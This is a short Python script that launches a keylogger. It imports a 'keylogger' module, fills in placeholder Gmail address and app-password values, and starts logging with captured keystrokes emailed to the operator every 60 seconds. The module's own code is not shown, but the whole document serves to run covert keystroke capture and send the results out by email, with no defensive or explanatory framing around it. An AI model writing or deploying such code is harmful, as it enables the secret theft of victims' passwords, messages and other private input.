import keylogger

EMAIL = "your_email@gmail.com"
PASSWORD = "your_app_password"
INTERVAL = 60  # seconds between email reports

clogger = keylogger.Keylogger(INTERVAL, EMAIL, PASSWORD)
clogger.start()
